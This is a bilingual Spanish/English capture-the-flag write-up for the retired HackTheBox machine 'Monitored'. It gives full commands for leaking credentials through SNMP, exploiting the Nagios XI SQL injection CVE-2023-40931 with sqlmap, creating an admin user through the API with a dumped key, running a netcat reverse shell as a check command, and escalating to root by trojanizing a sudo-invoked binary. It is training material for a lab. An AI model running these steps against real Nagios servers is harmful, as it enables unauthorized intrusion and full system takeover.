# Monitored [Medium]

> **ES:** Máquina Linux media con Nagios XI: credenciales vía SNMP, SQLi para escalar a admin y RCE con comandos, más abuso de sudo para root.
> **EN:** Medium Linux machine with Nagios XI: credentials via SNMP, SQLi to admin and command-based RCE, plus sudo abuse to root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Medium |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | TheCyberGeek & ruycr4ft |
| **URL** | https://app.hackthebox.com/machines/Monitored |
| **IP lab** | 10.10.11.248 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía SNMP → API Nagios → SQLi CVE-2023-40931 → RCE como `nagios`, y secuestro del binario `nagios` con sudo.
> **EN:** Get `user.txt` and `root.txt` via SNMP → Nagios API → SQLi CVE-2023-40931 → RCE as `nagios`, and hijack of the `nagios` binary with sudo.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap (TCP + UDP/SNMP 161)
- [ ] snmpwalk / onesixtyone
- [ ] ldapsearch (LDAP 389, sin hallazgos)
- [ ] feroxbuster (API `nagiosxi/api/v1/authenticate`)
- [ ] curl (API, creación de admin)
- [ ] sqlmap / Burp (SQLi en `banner_message-ajaxhelper.php`)
- [ ] nc / pwncat-cs (reverse shell)
- [ ] sudo -l + análisis de `manage_services.sh` / `/usr/local/nagios/bin/nagios`

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo TCP/UDP y registro de `nagios.monitored.htb` en `/etc/hosts`. LDAP (389) responde `dc=monitored,dc=htb` pero sin datos útiles.
> **EN:** TCP/UDP scan and registering `nagios.monitored.htb` in `/etc/hosts`. LDAP (389) answers `dc=monitored,dc=htb` but with no useful data.

```bash
nmap -sC -sV -oN nmap_init 10.10.11.248
nmap -sU --top-ports 50 10.10.11.248  # UDP: 123 ntp, 161 SNMP
echo "10.10.11.248 nagios.monitored.htb monitored.htb" | sudo tee -a /etc/hosts
ldapsearch -H ldap://monitored.htb -x -s base namingcontexts
ldapsearch -H ldap://monitored.htb -x -b "dc=monitored,dc=htb"
```

**Resultado / Result:** 22/tcp OpenSSH 8.4p1, 80/443/tcp Apache 2.4.56 (Nagios XI, cert `nagios.monitored.htb`), 389/tcp LDAP (vacío), 5667/tcp, UDP 161 SNMP. Captura del portal en `images/` y en `img/image_20240132-123225.png`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** SNMP con comunidad `public` expone la línea de proceso `sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB` → credencial `svc`. En el login web `svc` está deshabilitada (mensaje distinto), pero la API `POST /nagiosxi/api/v1/authenticate` (hallada con feroxbuster) sí devuelve `auth_token`. Nagios XI 5.11.0 → SQLi CVE-2023-40931 en `banner_message-ajaxhelper.php`.
> **EN:** SNMP with community `public` leaks the process line `sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB` → `svc` credential. Web login has `svc` disabled (different error), but the API `POST /nagiosxi/api/v1/authenticate` (found with feroxbuster) returns an `auth_token`. Nagios XI 5.11.0 → SQLi CVE-2023-40931 in `banner_message-ajaxhelper.php`.

```bash
snmpwalk -v 2c -c public monitored.htb | tee snmp_data
grep "RunParameters" snmp_data
# hrSWRunParameters... = "sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
feroxbuster -u https://nagios.monitored.htb/nagiosxi/api -m GET,POST -k
# -> /nagiosxi/api/v1/authenticate (200 GET+POST)
TOKEN=$(curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print $12}')
echo "$TOKEN"  # ej. dd23f7c0890fab17440fcf533b9dc3636595da49
# login con token: https://nagios.monitored.htb/nagiosxi/?token=$TOKEN
```

**Resultado / Result:** Credencial SNMP válida (`svc:XjH7VCehowpR1xZB`, credencial de laboratorio retirado) + token API; endpoint `/nagiosxi/admin/banner_message-ajaxhelper.php` inyectable (`id=3&action=acknowledge_banner_message`). Capturas del login/API en `images/`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Con la SQLi (sqlmap contra `banner_message-ajaxhelper.php` con cookie autenticada, `nagiosxi.xi_users --dump`) se extraen `api_key` y bcrypt de `nagiosadmin`/`svc` (no crackeables). Con la `api_key` de admin se crea un usuario admin vía API y, desde `Configure → Commands` (+ `Monitoring → Services → Run Check Command` en localhost), se ejecuta un check malicioso (`nc -e /bin/bash`, nota: `bash -c` directo falló) con reverse shell.
> **EN:** Via SQLi (sqlmap against `banner_message-ajaxhelper.php` with authenticated cookie, `nagiosxi.xi_users --dump`) extract `api_key` and bcrypt of `nagiosadmin`/`svc` (uncrackable). With the admin `api_key` create an admin user via API and, from `Configure → Commands` (+ `Monitoring → Services → Run Check Command` on localhost), run a malicious check (`nc -e /bin/bash`; note: direct `bash -c` failed) with a reverse shell.

```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" --cookie "nagiosxi=<cookie>" --dbms=MySQL -D nagiosxi -T xi_users --dump
# nagiosadmin api_key: IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
# svc api_key: 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK
curl -d "username=wither&password=wither&name=wither&email=wither@monitored.htb&auth_level=admin&force_pw_change=0" -k 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL'
# {"success":"User account wither was added successfully!","user_id":6}
# web como admin: Configure -> Commands -> Add New: nc -e /bin/bash <TU-IP> 9999
# Monitoring -> Services -> Add New (localhost, Check command=shell) -> Run Check Command
nc -lvnp 9999  # -> nagios@monitored:/home/nagios$
```

**Resultado / Result:** Reverse shell como `nagios`. Capturas del flujo Commands/Services en `img/` (`img/image_20240104-130436.png`, `img/image_20240105-130554.png`, `img/image_20240109-130936.png`, `img/image_20240111-131120.png`) y en `images/`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Lectura directa del flag con el contexto `nagios`.
> **EN:** Direct flag read with the `nagios` context.

```bash
whoami  # nagios
cat ~/user.txt  # formato: 5a94... (ofuscado)
```

**Resultado / Result:** `user.txt` obtenido (sin pegar flag completa).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `sudo -l` permite como root `/etc/init.d/nagios|npcd *`, varios `php …/nagiosxi/scripts/*.php *` y `manage_services.sh|backup_xi.sh|… *`. Los init.d no existen, pero el binario que invoca el servicio sí: `/usr/local/nagios/bin/nagios` (y `npcd`) pertenecen a `nagios` (escribibles). Se troyaniza `nagios` con un script que crea `/tmp/<f> ` SUID-root (`cp /bin/bash; chown root:root; chmod 6777`) y se ejecuta `sudo manage_services.sh restart nagios`: aunque el servicio falla, el binario ya corrió como root.
> **EN:** `sudo -l` allows as root `/etc/init.d/nagios|npcd *`, several `php …/nagiosxi/scripts/*.php *` and `manage_services.sh|backup_xi.sh|… *`. The init.d files don't exist, but the binary the service invokes does: `/usr/local/nagios/bin/nagios` (and `npcd`) are owned by `nagios` (writable). Trojanize `nagios` with a script creating SUID-root `/tmp/<f>` (`cp /bin/bash; chown root:root; chmod 6777`) and run `sudo manage_services.sh restart nagios`: the service fails but the binary already ran as root.

```bash
sudo -l
# (root) NOPASSWD: /etc/init.d/nagios start|stop|restart|reload|status|checkconfig
# (root) NOPASSWD: /etc/init.d/npcd start|stop|restart|reload|status
# (root) NOPASSWD: /usr/bin/php .../autodiscover_new.php|send_to_nls.php|migrate.php *
# (root) NOPASSWD: .../getprofile.sh, upgrade_to_latest.sh, change_timezone.sh
# (root) NOPASSWD: .../manage_services.sh *, reset_config_perms.sh, manage_ssl_config.sh *, backup_xi.sh *
ls -l /usr/local/nagios/bin/nagios  # -rwxrwxr-- nagios nagios (¡escribible!)
cat > /tmp/x.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/0xdf
chown root:root /tmp/0xdf
chmod 6777 /tmp/0xdf
EOF
cp /tmp/x.sh /usr/local/nagios/bin/nagios && chmod +x /usr/local/nagios/bin/nagios
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios  # falla, pero ejecutó
ls -la /tmp/0xdf  # -rwsrwsrwx root root
/tmp/0xdf -p  # root
cat /root/root.txt  # formato parcial ofuscado
```

**Resultado / Result:** Técnica: sudo sobre scripts/binarios de Nagios XI (secuestro del binario de servicio).

---

## 🧠 Lo aprendido / Learned

> **ES:** SNMP como fuente de credenciales (líneas de proceso), SQLi autenticada en Nagios XI (dump de `xi_users` → `api_key` → crear admin), RCE vía Commands/Services y privesc por sudo laxo + binario escribible.
> **EN:** SNMP as a credential source (process lines), authenticated SQLi in Nagios XI (`xi_users` dump → `api_key` → create admin), RCE via Commands/Services, and privesc via lax sudo + writable binary.

- [ ] Enum SNMP + API de Nagios XI y SQLi CVE-2023-40931 (`banner_message-ajaxhelper.php`)
- [ ] RCE vía Commands/Services (`nc -e /bin/bash`)
- [ ] Abuso de `sudo manage_services.sh` + `/usr/local/nagios/bin/nagios` escribible

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: ldapsearch, línea SNMP `check_host.sh`, feroxbuster API, dump `xi_users`, `curl` crear admin, troyanización de `nagios`) — wither/nota migrada
- **Walkthrough de referencia:** HackTheBox | Monitored — https://benheater.com/hackthebox-monitored — 0xBEN
- **Referencia técnica:** Nagios XI CVE-2023-40931 SQL Injection in Banner — https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567 — n1ghtcr4wl3r
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
